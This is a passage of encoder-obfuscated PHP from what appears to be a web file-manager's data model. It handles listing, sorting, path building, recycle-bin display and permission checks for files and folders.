$ΡγΩ›Χ] = $ήΪ›φήΨ; } $this->alias($²¶ΙΏύΛ[522])->field($“Υά°­»)->limit($£Τγ£Κύ)->order($θ°ό—…Ν); $Σ—ƒιΟ = $this->join($λΠ±ϊ΄—)->where($ΎπΉΎ)->select(); if ($Σ—ƒιΟ) { $τηΝόΏ[$²¶ΙΏύΛ[448]] = $Σ—ƒιΟ; } } protected function _makeOrder($–ΎΡ = false) { $ΡΘ΄Δ½’ =& $_SERVER[γγάψ½]; $ΙιΡΆ = Model($ΡΘ΄Δ½’[523])->get($ΡΘ΄Δ½’[524]); $—ΦΩΠψά = Model($ΡΘ΄Δ½’[523])->get($ΡΘ΄Δ½’[525]); $λ°δΎ = array($ΡΘ΄Δ½’[526] => $ΡΘ΄Δ½’[527], $ΡΘ΄Δ½’[528] => $ΡΘ΄Δ½’[529]); $άξω„Ύ = array($ΡΘ΄Δ½’[32] => $ΡΘ΄Δ½’[32], $ΡΘ΄Δ½’[79] => $ΡΘ΄Δ½’[79], $ΡΘ΄Δ½’[169] => $ΡΘ΄Δ½’[489], $ΡΘ΄Δ½’[530] => $ΡΘ΄Δ½’[530], $ΡΘ΄Δ½’[531] => $ΡΘ΄Δ½’[532], $ΡΘ΄Δ½’[234] => $ΡΘ΄Δ½’[234], $ΡΘ΄Δ½’[88] => $ΡΘ΄Δ½’[88]); $Δ»Η Ή = Input::get($ΡΘ΄Δ½’[533], $ΡΘ΄Δ½’[7], $ΙιΡΆ, array_keys($άξω„Ύ)); $ΥΆ·χμ– = Input::get($ΡΘ΄Δ½’[534], $ΡΘ΄Δ½’[7], $—ΦΩΠψά, array_keys($λ°δΎ)); if (!in_array($Δ»Η Ή, array_keys($άξω„Ύ))) { $Δ»Η Ή = $ΡΘ΄Δ½’[32]; } if (!in_array($ΥΆ·χμ–, array_keys($λ°δΎ))) { $Δ»Η Ή = $ΡΘ΄Δ½’[526]; } if ($Δ»Η Ή == $ΡΘ΄Δ½’[32]) { } $ή‰·’χυ = $ΡΘ΄Δ½’[535] . $άξω„Ύ[$Δ»Η Ή] . $ΡΘ΄Δ½’[53] . $λ°δΎ[$ΥΆ·χμ–]; $ή‰·’χυ = rtrim(trim($ή‰·’χυ), $ΡΘ΄Δ½’[50]); if ($–ΎΡ) { return array($ή‰·’χυ, $λ°δΎ[$ΥΆ·χμ–]); } return $this->order($ή‰·’χυ); } protected function _listDataApplyItem($γΜΦ©Ήσ, $‘ Ι±Μό = false) { $¤¥‰•¬Ϋ = array($γΜΦ©Ήσ); $this->_listDataApply($¤¥‰•¬Ϋ, $‘ Ι±Μό); return $¤¥‰•¬Ϋ[0]; } protected function _listDataApply(&$Αί¥–, $ή“ΉΑ‘ = false) { $”νώΤΞ =& $_SERVER[γγάψ½]; if (!$Αί¥–) { $Αί¥– = array(); return; } $—­¦μΔ– = array_to_keyvalue($Αί¥–, $”νώΤΞ[12], $”νώΤΞ[194]); $—­¦μΔ– = array_unique($—­¦μΔ–); $this->_listSourceCache($Αί¥–); if (!$ή“ΉΑ‘) { $this->_listAppendMeta($Αί¥–, $—­¦μΔ–); $this->_listAppendFileMeta($Αί¥–, $—­¦μΔ–); $this->_listAppendChildren($Αί¥–, $—­¦μΔ–); } $this->_listAppendPath($Αί¥–); $this->_listAppendAuth($Αί¥–); $this->_listAppendSourceInfo($Αί¥–, $—­¦μΔ–); $this->_listAppendUser($Αί¥–); $this->_listFilterInfo($Αί¥–, $ή“ΉΑ‘); $this->_listAppendAuthSecret($Αί¥–); } protected function _listSourceCache($€ζƒ) { $Ζϊϋκ =& $_SERVER[γγάψ½]; foreach ($€ζƒ as $®“ίυΈΐ) { self::$cacheSourceInfo[$Ζϊϋκ[536] . $®“ίυΈΐ[$Ζϊϋκ[194]]] = $®“ίυΈΐ; } } protected function _listFilterInfo(&$Τ³ΙκΣ, $·ί­Εώ = false) { $ΘΆ»‚εΨ =& $_SERVER[γγάψ½]; foreach ($Τ³ΙκΣ as &$όάΊϋ) { $όάΊϋ = $this->pathInfoFilter($όάΊϋ); self::$cachePathInfo[$ΘΆ»‚εΨ[537] . intval($·ί­Εώ) . $ΘΆ»‚εΨ[465] . $όάΊϋ[$ΘΆ»‚εΨ[194]]] = $όάΊϋ; } unset($όάΊϋ); } protected function _listMake(&$εζΠύρ) { $ΒΫ³¦Ι =& $_SERVER[γγάψ½]; $εζΠύρ[$ΒΫ³¦Ι[85]] = array(); $εζΠύρ[$ΒΫ³¦Ι[86]] = array(); foreach ($εζΠύρ[$ΒΫ³¦Ι[448]] as $ϊΪ’Ο­) { $Ρ ”σπ = $ϊΪ’Ο­[$ΒΫ³¦Ι[488]] == 1 ? $ΒΫ³¦Ι[85] : $ΒΫ³¦Ι[86]; $εζΠύρ[$Ρ ”σπ][] = $ϊΪ’Ο­; } unset($εζΠύρ[$ΒΫ³¦Ι[448]]); } protected function _listAppendMeta(&$§κ°Δ®ζ, $ύ—ΰγ’) { $¶ΪίΏ =& $_SERVER[γγάψ½]; $’Ιθϋ = array($¶ΪίΏ[494] => array($¶ΪίΏ[495], $ύ—ΰγ’)); $«ΐα Ί = Model($¶ΪίΏ[538])->field($¶ΪίΏ[539])->where($’Ιθϋ)->select(); if (!$«ΐα Ί) { return; } $«•½λΞΰ = array($¶ΪίΏ[540], $¶ΪίΏ[541], $¶ΪίΏ[520]); $ΓώϊΌγ΅ = array(); foreach ($«ΐα Ί as $ΉΩ―ΚΣ) { if (!isset($ΓώϊΌγ΅[$ΉΩ―ΚΣ[$¶ΪίΏ[194]]])) { $ΓώϊΌγ΅[$ΉΩ―ΚΣ[$¶ΪίΏ[194]]] = array(); } if (in_array($ΉΩ―ΚΣ[$¶ΪίΏ[97]], $«•½λΞΰ)) { continue; } if ($ΉΩ―ΚΣ[$¶ΪίΏ[97]] == $¶ΪίΏ[542]) { $ΉΩ―ΚΣ[$¶ΪίΏ[453]] = $¶ΪίΏ[543]; } $ΓώϊΌγ΅[$ΉΩ―ΚΣ[$¶ΪίΏ[194]]][$ΉΩ―ΚΣ[$¶ΪίΏ[97]]] = $ΉΩ―ΚΣ[$¶ΪίΏ[453]]; } foreach ($§κ°Δ®ζ as &$Οχ«ς©γ) { $Οχ«ς©γ[$¶ΪίΏ[544]] = !1; if (isset($ΓώϊΌγ΅[$Οχ«ς©γ[$¶ΪίΏ[194]]])) { $Οχ«ς©γ[$¶ΪίΏ[544]] = $ΓώϊΌγ΅[$Οχ«ς©γ[$¶ΪίΏ[194]]]; } if ($this->fileIsLock($Οχ«ς©γ) && $Οχ«ς©γ[$¶ΪίΏ[490]]) { $α¤ο‘κΜ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Οχ«ς©γ[$¶ΪίΏ[490]][$¶ΪίΏ[491]] = AuthModel::authDisable($Οχ«ς©γ[$¶ΪίΏ[490]][$¶ΪίΏ[491]], $α¤ο‘κΜ); $Οχ«ς©γ[$¶ΪίΏ[490]][$¶ΪίΏ[545]][$¶ΪίΏ[490]] = $Οχ«ς©γ[$¶ΪίΏ[490]][$¶ΪίΏ[491]]; } } unset($Οχ«ς©γ); } protected function _listAppendFileMeta(&$α«°¬, $‹²¶τ) { $²Ϊή±―Φ =& $_SERVER[γγάψ½]; $κ’‚γε = array_to_keyvalue($α«°¬, $²Ϊή±―Φ[12], $²Ϊή±―Φ[546]); $κ’‚γε = array_filter(array_unique($κ’‚γε)); if (!$κ’‚γε) { return; } $”¶τϋ‚ = array($²Ϊή±―Φ[547] => array($²Ϊή±―Φ[495], $κ’‚γε)); $λΰ»Ίε¤ = $²Ϊή±―Φ[548]; $ΔΕβωμ† = Model($²Ϊή±―Φ[549])->field($λΰ»Ίε¤)->where($”¶τϋ‚)->select(); $ΔΕβωμ† = array_to_keyvalue($ΔΕβωμ†, $²Ϊή±―Φ[546]); $Χ΅ζΌΰ· = Model($²Ϊή±―Φ[550])->field($²Ϊή±―Φ[551])->where($”¶τϋ‚)->select(); $Χ΅ζΌΰ· = $Χ΅ζΌΰ· ? $Χ΅ζΌΰ· : array(); $Ύΐ―Ϊ” = array(); foreach ($Χ΅ζΌΰ· as $‚ΙυΆ¦ό) { if (!isset($Ύΐ―Ϊ”[$‚ΙυΆ¦ό[$²Ϊή±―Φ[546]]])) { $Ύΐ―Ϊ”[$‚ΙυΆ¦ό[$²Ϊή±―Φ[546]]] = array(); } $Ύΐ―Ϊ”[$‚ΙυΆ¦ό[$²Ϊή±―Φ[546]]][$‚ΙυΆ¦ό[$²Ϊή±―Φ[97]]] = $‚ΙυΆ¦ό[$²Ϊή±―Φ[453]]; } foreach ($α«°¬ as &$ΚΙίΞλ) { $¬™’Σ¦› = $ΚΙίΞλ[$²Ϊή±―Φ[546]]; if (!$¬™’Σ¦› || !is_array($ΔΕβωμ†[$¬™’Σ¦›])) { continue; } $ζΛόήΕ• = $ΔΕβωμ†[$¬™’Σ¦›]; $ζΛόήΕ•[$²Ϊή±―Φ[79]] = $ΚΙίΞλ[$²Ϊή±―Φ[79]]; $ζΛόήΕ•[$²Ϊή±―Φ[32]] = $ΚΙίΞλ[$²Ϊή±―Φ[32]]; if (!$ζΛόήΕ•[$²Ϊή±―Φ[552]]) { Model($²Ϊή±―Φ[549])->fileMd5Check($ζΛόήΕ•); } if (!isset(self::$cacheFileInfo[$²Ϊή±―Φ[553] . $¬™’Σ¦›])) { self::$cacheFileInfo[$²Ϊή±―Φ[553] . $¬™’Σ¦›] = array_merge(array(), $ζΛόήΕ•); } unset($ΔΕβωμ†[$¬™’Σ¦›][$²Ϊή±―Φ[87]]); $Λ¦‡Ε• = isset($Ύΐ―Ϊ”[$¬™’Σ¦›]) && is_array($Ύΐ―Ϊ”[$¬™’Σ¦›]) ? $Ύΐ―Ϊ”[$¬™’Σ¦›] : array(); $ΚΙίΞλ[$²Ϊή±―Φ[170]] = array_merge($Λ¦‡Ε•, $ΔΕβωμ†[$¬™’Σ¦›]); if (isset($ΚΙίΞλ[$²Ϊή±―Φ[170]][$²Ϊή±―Φ[185]])) { $ΚΙίΞλ[$²Ϊή±―Φ[185]] = json_decode($ΚΙίΞλ[$²Ϊή±―Φ[170]][$²Ϊή±―Φ[185]], !0); unset($ΚΙίΞλ[$²Ϊή±―Φ[170]][$²Ϊή±―Φ[185]]); } } unset($ΚΙίΞλ); } protected function _listAppendSourceInfo(&$α™φ¬®Ό, $Φ„£¤ξ©) { $†δ¨ =& $_SERVER[γγάψ½]; $²µ­– = Model($†δ¨[554])->listData(); $Φμ¥¨£ = Model($†δ¨[502])->listData(); $¤Ιό¶ = Model($†δ¨[492])->listData(); $πΨ·§υ™ = Model($†δ¨[555])->listSimple(); $ΊγΣΫΗ = array_to_keyvalue($²µ­–, $†δ¨[478]); $ηΛΞ€γ = array_to_keyvalue_group($Φμ¥¨£, $†δ¨[87], $†δ¨[503]); $Λξξδ½” = array_to_keyvalue($¤Ιό¶, $†δ¨[87]); $ίι–ρΜ = array_to_keyvalue_group($πΨ·§υ™, $†δ¨[194]); foreach ($α™φ¬®Ό as &$ορΪγή) { $ορΪγή[$†δ¨[90]] = array($†δ¨[556] => 0, $†δ¨[557] => 0, $†δ¨[558] => 0); if (isset($Λξξδ½”[$ορΪγή[$†δ¨[194]]])) { $ορΪγή[$†δ¨[90]][$†δ¨[559]] = 1; $ορΪγή[$†δ¨[90]][$†δ¨[560]] = $Λξξδ½”[$ορΪγή[$†δ¨[194]]][$†δ¨[32]]; } if ($ηΛΞ€γ && $ΊγΣΫΗ && isset($ηΛΞ€γ[$ορΪγή[$†δ¨[194]]])) { $ορΪγή[$†δ¨[90]][$†δ¨[561]] = array(); foreach ($ηΛΞ€γ[$ορΪγή[$†δ¨[194]]] as $τβιο‰Ξ) { $Φμη²„ = $ΊγΣΫΗ[$τβιο‰Ξ]; $ορΪγή[$†δ¨[90]][$†δ¨[561]][] = array($†δ¨[562] => $Φμη²„[$†δ¨[478]], $†δ¨[497] => $Φμη²„[$†δ¨[32]], $†δ¨[563] => $Φμη²„[$†δ¨[564]]); } } if ($ίι–ρΜ && isset($ίι–ρΜ[$ορΪγή[$†δ¨[194]]])) { $ορΪγή[$†δ¨[90]][$†δ¨[565]] = array(); foreach ($ίι–ρΜ[$ορΪγή[$†δ¨[194]]] as $ΒΝ¬Δ) { $‹ΒΉνΖΕ = $†δ¨[566]; if ($ΒΝ¬Δ[$†δ¨[567]] == $†δ¨[91]) { $‹ΒΉνΖΕ .= $†δ¨[568]; } $ορΪγή[$†δ¨[90]][$†δ¨[565]] = array_field_key($ΒΝ¬Δ, explode($†δ¨[50], $‹ΒΉνΖΕ)); } } } unset($ορΪγή); return $α™φ¬®Ό; } protected function _listAppendChildren(&$ΠΝβχ, $ω·ύΚµδ) { $ορηί›Ά =& $_SERVER[γγάψ½]; $¥’‹ΣφΊ = array(); $ν΄‚χΖζ = array($ορηί›Ά[242] => 0, $ορηί›Ά[243] => 0); foreach ($ΠΝβχ as &$Λ΅―…Ε) { if (!$Λ΅―…Ε[$ορηί›Ά[488]]) { continue; } $¥’‹ΣφΊ[] = $Λ΅―…Ε[$ορηί›Ά[194]]; } unset($Λ΅―…Ε); if (!$¥’‹ΣφΊ) { return; } $όΣοσμ = array($ορηί›Ά[193] => array($ορηί›Ά[7], $¥’‹ΣφΊ), $ορηί›Ά[508] => 0); $Ε·θδ = array($ορηί›Ά[193], $ορηί›Ά[488], $ορηί›Ά[569] => $ορηί›Ά[570]); $Ε§®Ώ€ = $this->field($Ε·θδ)->where($όΣοσμ)->group($ορηί›Ά[571])->select(); $ε¬²τνΌ = array(); foreach ($Ε§®Ώ€ as $ή‚υδΜ) { $ΎΉϊΕ = $ή‚υδΜ[$ορηί›Ά[193]]; $¦ρ±Ζ = $ή‚υδΜ[$ορηί›Ά[488]] == $ορηί›Ά[91] ? $ορηί›Ά[243] : $ορηί›Ά[242]; if (!isset($ε¬²τνΌ[$ΎΉϊΕ])) { $ε¬²τνΌ[$ΎΉϊΕ] = array($ορηί›Ά[242] => 0, $ορηί›Ά[243] => 0); } $ε¬²τνΌ[$ΎΉϊΕ][$¦ρ±Ζ] += $ή‚υδΜ[$ορηί›Ά[570]]; } foreach ($ΠΝβχ as &$Λ΅―…Ε) { if (!$Λ΅―…Ε[$ορηί›Ά[488]]) { continue; } $ΐ„΄²υ = is_array($ε¬²τνΌ[$Λ΅―…Ε[$ορηί›Ά[194]]]) ? $ε¬²τνΌ[$Λ΅―…Ε[$ορηί›Ά[194]]] : $ν΄‚χΖζ; $Λ΅―…Ε[$ορηί›Ά[243]] = $ΐ„΄²υ[$ορηί›Ά[243]]; $Λ΅―…Ε[$ορηί›Ά[242]] = $ΐ„΄²υ[$ορηί›Ά[242]]; unset($Λ΅―…Ε[$ορηί›Ά[489]]); } unset($Λ΅―…Ε); } protected function _listAppendAuth(&$ρ΄€ίψ) { $‡ξ³Όϊ° =& $_SERVER[γγάψ½]; $Σό—ƒΟζ = array(); foreach ($ρ΄€ίψ as $ΐ†σΌ—‰) { if ($ΐ†σΌ—‰[$‡ξ³Όϊ°[191]] == self::TYPE_GROUP) { $Σό—ƒΟζ[] = $ΐ†σΌ—‰[$‡ξ³Όϊ°[194]]; } } if (!$Σό—ƒΟζ) { return; } $“ΡΪ‰– = array_to_keyvalue($ρ΄€ίψ, $‡ξ³Όϊ°[194]); $―Κφ―π = Model($‡ξ³Όϊ°[572])->getSourceList($Σό—ƒΟζ, $“ΡΪ‰–); $ΤήςΎΞΔ = KodUser::isRoot(); foreach ($ρ΄€ίψ as $Άωηη― => &$ΐ†σΌ—‰) { $ΐ†σΌ—‰[$‡ξ³Όϊ°[490]] = $―Κφ―π[$ΐ†σΌ—‰[$‡ξ³Όϊ°[194]]]; if (!$ΐ†σΌ—‰[$‡ξ³Όϊ°[490]] && $ΐ†σΌ—‰[$‡ξ³Όϊ°[191]] == self::TYPE_GROUP) { $ΐ†σΌ—‰[$‡ξ³Όϊ°[490]] = Action($‡ξ³Όϊ°[573])->pathGroupAuthMake($ΐ†σΌ—‰[$‡ξ³Όϊ°[574]]); if (!$ΐ†σΌ—‰[$‡ξ³Όϊ°[490]] && !$ΤήςΎΞΔ) { $ΐ†σΌ—‰[$‡ξ³Όϊ°[236]] = !1; $ΐ†σΌ—‰[$‡ξ³Όϊ°[235]] = !1; } } if ($ΐ†σΌ—‰[$‡ξ³Όϊ°[490]]) { $ΐ†σΌ—‰[$‡ξ³Όϊ°[236]] = AuthModel::authCheckEdit($ΐ†σΌ—‰[$‡ξ³Όϊ°[490]][$‡ξ³Όϊ°[491]]); $ΐ†σΌ—‰[$‡ξ³Όϊ°[235]] = AuthModel::authCheckView($ΐ†σΌ—‰[$‡ξ³Όϊ°[490]][$‡ξ³Όϊ°[491]]); } $this->groupPathDisplay($ΐ†σΌ—‰); } unset($ΐ†σΌ—‰); } public function _listAppendAuthSecret(&$ςΓ©ψ) { $έ»››¶ΰ =& $_SERVER[γγάψ½]; if (Model($έ»››¶ΰ[511])->get($έ»››¶ΰ[575]) != $έ»››¶ΰ[91]) { return; } static $„ζ†ήΙπ = false; if (!$„ζ†ήΙπ) { $†”Ώ¦Θ = Model($έ»››¶ΰ[576]); $΅υϊ‚ΰό = Model($έ»››¶ΰ[577]); $„ζ†ήΙπ = $΅υϊ‚ΰό->listData(); $„ζ†ήΙπ = array_to_keyvalue($„ζ†ήΙπ, $έ»››¶ΰ[194]); $Ύθωƒ¦ = json_decode(Model($έ»››¶ΰ[511])->get($έ»››¶ΰ[578]), !0); $Ύθωƒ¦ = array_to_keyvalue($Ύθωƒ¦, $έ»››¶ΰ[478]); foreach ($„ζ†ήΙπ as $γκ³ => $―ΗΨΙΚ) { $¶¥„λ…€ = $Ύθωƒ¦[$―ΗΨΙΚ[$έ»››¶ΰ[579]]]; if (!$¶¥„λ…€) { $΅υϊ‚ΰό->remove($―ΗΨΙΚ[$έ»››¶ΰ[478]]); unset($„ζ†ήΙπ[$γκ³]); continue; } $ζα“ΰΉΣ = $†”Ώ¦Θ->listData($¶¥„λ…€[$έ»››¶ΰ[490]]); if (!$ζα“ΰΉΣ) { $΅υϊ‚ΰό->remove($―ΗΨΙΚ[$έ»››¶ΰ[478]]); unset($„ζ†ήΙπ[$γκ³]); continue; } $―ΗΨΙΚ[$έ»››¶ΰ[490]] = $ζα“ΰΉΣ; $―ΗΨΙΚ[$έ»››¶ΰ[580]] = $¶¥„λ…€; $―ΗΨΙΚ[$έ»››¶ΰ[581]] = Model($έ»››¶ΰ[582])->getInfoSimpleOuter($―ΗΨΙΚ[$έ»››¶ΰ[530]]); $„ζ†ήΙπ[$γκ³] = $―ΗΨΙΚ; } } $±Ω¬Τ‘£ = USER_ID; $»Υ“―ν” = array(); $―έ¦κΧσ = $this->_listAppendPath($»Υ“―ν”, !0); foreach ($ςΓ©ψ as $γκ³ => &$―ΗΨΙΚ) { if (!is_array($―ΗΨΙΚ[$έ»››¶ΰ[490]])) { continue; } if ($―ΗΨΙΚ[$έ»››¶ΰ[191]] != $έ»››¶ΰ[583]) { continue; } if (isset($„ζ†ήΙπ[$―ΗΨΙΚ[$έ»››¶ΰ[194]]])) { $Ν©™¦π = $„ζ†ήΙπ[$―ΗΨΙΚ[$έ»››¶ΰ[194]]]; if (!is_array($―ΗΨΙΚ[$έ»››¶ΰ[544]])) { $―ΗΨΙΚ[$έ»››¶ΰ[544]] = array(); } $―ΗΨΙΚ[$έ»››¶ΰ[544]][$έ»››¶ΰ[584]] = $Ν©™¦π[$έ»››¶ΰ[579]]; $―ΗΨΙΚ[$έ»››¶ΰ[490]][$έ»››¶ΰ[585]] = $Ν©™¦π; $―ΗΨΙΚ[$έ»››¶ΰ[490]][$έ»››¶ΰ[586]] = $―ΗΨΙΚ[$έ»››¶ΰ[587]]; $―ΗΨΙΚ[$έ»››¶ΰ[490]][$έ»››¶ΰ[588]] = $έ»››¶ΰ[91]; if ($Ν©™¦π[$έ»››¶ΰ[530]] != $±Ω¬Τ‘£) { $―ΗΨΙΚ[$έ»››¶ΰ[490]][$έ»››¶ΰ[491]] = $―ΗΨΙΚ[$έ»››¶ΰ[490]][$έ»››¶ΰ[491]] & $Ν©™¦π[$έ»››¶ΰ[490]][$έ»››¶ΰ[490]]; } continue; } $ίγ΄Ώ = $this->parentLevelArray($―ΗΨΙΚ[$έ»››¶ΰ[589]]); $ίΥΛ΅¦Ί = array_reverse($ίγ΄Ώ); foreach ($ίΥΛ΅¦Ί as $ΫΦ»έ½ => $τΕ½›ΠΫ) { if (!isset($„ζ†ήΙπ[$τΕ½›ΠΫ])) { continue; } $Ν©™¦π = $„ζ†ήΙπ[$τΕ½›ΠΫ]; $―ΗΨΙΚ[$έ»››¶ΰ[490]][$έ»››¶ΰ[585]] = $Ν©™¦π; if ($Ν©™¦π[$έ»››¶ΰ[530]] != $±Ω¬Τ‘£) { $―ΗΨΙΚ[$έ»››¶ΰ[490]][$έ»››¶ΰ[491]] = $―ΗΨΙΚ[$έ»››¶ΰ[490]][$έ»››¶ΰ[491]] & $Ν©™¦π[$έ»››¶ΰ[490]][$έ»››¶ΰ[490]]; } $Ψ°έ = $έ»››¶ΰ[12]; $¤ΚβΚ« = count($ίγ΄Ώ) - $ΫΦ»έ½; for ($½™αΨΏ = 0; $½™αΨΏ < $¤ΚβΚ«; $½™αΨΏ++) { if (!isset($―έ¦κΧσ[$ίγ΄Ώ[$½™αΨΏ]])) { $Ψ°έ = $έ»››¶ΰ[12]; break; } $Ψ°έ = $Ψ°έ . rtrim($―έ¦κΧσ[$ίγ΄Ώ[$½™αΨΏ]], $έ»››¶ΰ[8]) . $έ»››¶ΰ[8]; } $―ΗΨΙΚ[$έ»››¶ΰ[490]][$έ»››¶ΰ[586]] = rtrim($Ψ°έ, $έ»››¶ΰ[8]) . $έ»››¶ΰ[8]; break; } } unset($―ΗΨΙΚ); } public function groupPathDisplay(&$όΞλλΛ®) { $ΑΝ€μ“α =& $_SERVER[γγάψ½]; if ($όΞλλΛ®[$ΑΝ€μ“α[191]] != self::TYPE_GROUP) { return; } $ϊ®΄²― = Model($ΑΝ€μ“α[590])->getInfo($όΞλλΛ®[$ΑΝ€μ“α[574]]); $€ά²βΛ = $this->parentLevelArray($ϊ®΄²―[$ΑΝ€μ“α[589]]); $γψΞυΓς = $ΑΝ€μ“α[12]; foreach ($€ά²βΛ as $Λ•„Λϋ€) { $Υ½“Σ» = Model($ΑΝ€μ“α[590])->getInfo($Λ•„Λϋ€); $γψΞυΓς .= $Υ½“Σ»[$ΑΝ€μ“α[90]][$ΑΝ€μ“α[194]] . $ΑΝ€μ“α[50]; } $όΞλλΛ®[$ΑΝ€μ“α[591]] = $ϊ®΄²―[$ΑΝ€μ“α[193]]; $όΞλλΛ®[$ΑΝ€μ“α[592]] = $ϊ®΄²―[$ΑΝ€μ“α[589]]; $όΞλλΛ®[$ΑΝ€μ“α[593]] = $ϊ®΄²―[$ΑΝ€μ“α[594]]; $όΞλλΛ®[$ΑΝ€μ“α[595]] = $γψΞυΓς . $ϊ®΄²―[$ΑΝ€μ“α[90]][$ΑΝ€μ“α[194]]; } protected function _listAppendPath(&$µ™Ψƒ, $ΠΞ°ΫΓ  = false) { $©”«¥ΈΣ =& $_SERVER[γγάψ½]; static $χσνΕΌ = array(); $―Ή¶‘ = array(); $ίΙ®ϋΠ = array(); if ($ΠΞ°ΫΓ ) { return $χσνΕΌ; } foreach ($µ™Ψƒ as &$²ϋΓϊΏ) { $θζ†€ξΫ = $²ϋΓϊΏ[$©”«¥ΈΣ[194]]; if ($²ϋΓϊΏ[$©”«¥ΈΣ[488]] == $©”«¥ΈΣ[91] && $²ϋΓϊΏ[$©”«¥ΈΣ[193]] != 0) { $χσνΕΌ[$θζ†€ξΫ] = $²ϋΓϊΏ[$©”«¥ΈΣ[32]]; } if ($²ϋΓϊΏ[$©”«¥ΈΣ[488]] == $©”«¥ΈΣ[91] && $²ϋΓϊΏ[$©”«¥ΈΣ[193]] == 0) { $χσνΕΌ[$θζ†€ξΫ] = $this->_listAppendPathRoot($²ϋΓϊΏ, array()); } if (isset($ίΙ®ϋΠ[$²ϋΓϊΏ[$©”«¥ΈΣ[589]]])) { continue; } $ίΙ®ϋΠ[$²ϋΓϊΏ[$©”«¥ΈΣ[589]]] = !0; $ψ’Βε•Ώ = $this->parentLevelArray($²ϋΓϊΏ[$©”«¥ΈΣ[589]]); foreach ($ψ’Βε•Ώ as $°ΐ‚Ηί => $¨§Ίµ«β) { if (isset($χσνΕΌ[$¨§Ίµ«β])) { continue; } if ($°ΐ‚Ηί == 0) { $χσνΕΌ[$¨§Ίµ«β] = $this->_listAppendPathRoot($²ϋΓϊΏ, $ψ’Βε•Ώ); } if ($°ΐ‚Ηί != 0) { $―Ή¶‘[] = $¨§Ίµ«β; } } } unset($²ϋΓϊΏ); $―Ή¶‘ = array_unique($―Ή¶‘); if (count($―Ή¶‘) > 0) { $λΔΜΛΞν = array($©”«¥ΈΣ[494] => array($©”«¥ΈΣ[495], $―Ή¶‘)); if (count($―Ή¶‘) == 1) { $Ζώ“½ι = $this->sourceInfo($―Ή¶‘[0]); $ΗΩ‚’ = is_array($Ζώ“½ι) ? array($Ζώ“½ι) : !1; } else { $ΗΩ‚’ = $this->field($©”«¥ΈΣ[596])->where($λΔΜΛΞν)->select(); } if (!$ΗΩ‚’) { $ΗΩ‚’ = array(); } foreach ($ΗΩ‚’ as $¬―·„ƒ) { $χσνΕΌ[$¬―·„ƒ[$©”«¥ΈΣ[194]]] = $¬―·„ƒ[$©”«¥ΈΣ[32]]; } } $τ‚ωΡµξ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Άίσ„ω = array(); foreach ($µ™Ψƒ as &$²ϋΓϊΏ) { $ΊΧ¬Ι€Ί = $²ϋΓϊΏ[$©”«¥ΈΣ[589]]; $¤ΊΩβρΠ = $©”«¥ΈΣ[12]; if (isset($Άίσ„ω[$ΊΧ¬Ι€Ί])) { $¤ΊΩβρΠ = $Άίσ„ω[$ΊΧ¬Ι€Ί]; } else { $ψ’Βε•Ώ = $this->parentLevelArray($²ϋΓϊΏ[$©”«¥ΈΣ[589]]); foreach ($ψ’Βε•Ώ as $°ΐ‚Ηί => $¨§Ίµ«β) { if (isset($χσνΕΌ[$¨§Ίµ«β])) { $¤ΊΩβρΠ .= $χσνΕΌ[$¨§Ίµ«β] . $©”«¥ΈΣ[8]; } } $Άίσ„ω[$ΊΧ¬Ι€Ί] = $¤ΊΩβρΠ; } $¤ΊΩβρΠ .= $²ϋΓϊΏ[$©”«¥ΈΣ[32]]; if ($²ϋΓϊΏ[$©”«¥ΈΣ[488]] == $©”«¥ΈΣ[91]) { $¤ΊΩβρΠ .= $©”«¥ΈΣ[8]; } $²ϋΓϊΏ[$©”«¥ΈΣ[587]] = str_replace($©”«¥ΈΣ[257], $©”«¥ΈΣ[8], $¤ΊΩβρΠ); if ($²ϋΓϊΏ[$©”«¥ΈΣ[193]] == $©”«¥ΈΣ[231]) { $²ϋΓϊΏ[$©”«¥ΈΣ[32]] = trim($χσνΕΌ[$²ϋΓϊΏ[$©”«¥ΈΣ[194]]], $©”«¥ΈΣ[8]); $²ϋΓϊΏ[$©”«¥ΈΣ[587]] = $²ϋΓϊΏ[$©”«¥ΈΣ[32]] . $©”«¥ΈΣ[8]; } if (intval($²ϋΓϊΏ[$©”«¥ΈΣ[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($²ϋΓϊΏ, $ψ’Βε•Ώ, $τ‚ωΡµξ); } } unset($²ϋΓϊΏ); return $µ™Ψƒ; } private function _listAppendPathRecycle(&$Ρ™Χ„£›, $ΊΖ‹φΞτ, $©¬ΎΌ®Ν) { $ψυΐΌΝΝ =& $_SERVER[γγάψ½]; if (!in_array($©¬ΎΌ®Ν, $ΊΖ‹φΞτ) && $Ρ™Χ„£›[$ψυΐΌΝΝ[194]] != $©¬ΎΌ®Ν) { return; } $Ρψΰ = explode($ψυΐΌΝΝ[8], trim($Ρ™Χ„£›[$ψυΐΌΝΝ[587]], $ψυΐΌΝΝ[8])); $έύ―έ‹ο = implode($ψυΐΌΝΝ[8], array_slice($Ρψΰ, 2)); $Ρ™Χ„£›[$ψυΐΌΝΝ[587]] = $ψυΐΌΝΝ[8] . LNG($ψυΐΌΝΝ[597]) . $ψυΐΌΝΝ[8] . ltrim($έύ―έ‹ο, $ψυΐΌΝΝ[8]); $Ρ™Χ„£›[$ψυΐΌΝΝ[589]] = $ψυΐΌΝΝ[598] . implode($ψυΐΌΝΝ[50], array_slice($ΊΖ‹φΞτ, 1)) . $ψυΐΌΝΝ[50]; if ($Ρ™Χ„£›[$ψυΐΌΝΝ[194]] == $©¬ΎΌ®Ν) { $Ρ™Χ„£›[$ψυΐΌΝΝ[589]] = $ψυΐΌΝΝ[598]; $Ρ™Χ„£›[$ψυΐΌΝΝ[193]] = $ψυΐΌΝΝ[231]; $Ρ™Χ„£›[$ψυΐΌΝΝ[32]] = LNG($ψυΐΌΝΝ[597]); } $Ρ™Χ„£›[$ψυΐΌΝΝ[599]] = $ψυΐΌΝΝ[600]; } protected function _listAppendPathRoot(&$·μθτΟΡ, $Ϋεά§¨) { $ψίΥ° =& $_SERVER[γγάψ½]; static $ΆΛθμ§™ = false; static $γ¦υΘώ = false; $“ΑθΑ“― = $ψίΥ°[12]; if ($·μθτΟΡ[$ψίΥ°[191]] == self::TYPE_USER) { if ($·μθτΟΡ[$ψίΥ°[574]] == USER_ID) { $“ΑθΑ“― = LNG($ψίΥ°[601]); if ($ΆΛθμ§™ === !1) { $±ςα©Τ = Model($ψίΥ°[602])->getInfoFull(USER_ID); $ΆΛθμ§™ = _get($±ςα©Τ, $ψίΥ°[603], $ψίΥ°[12]); } if 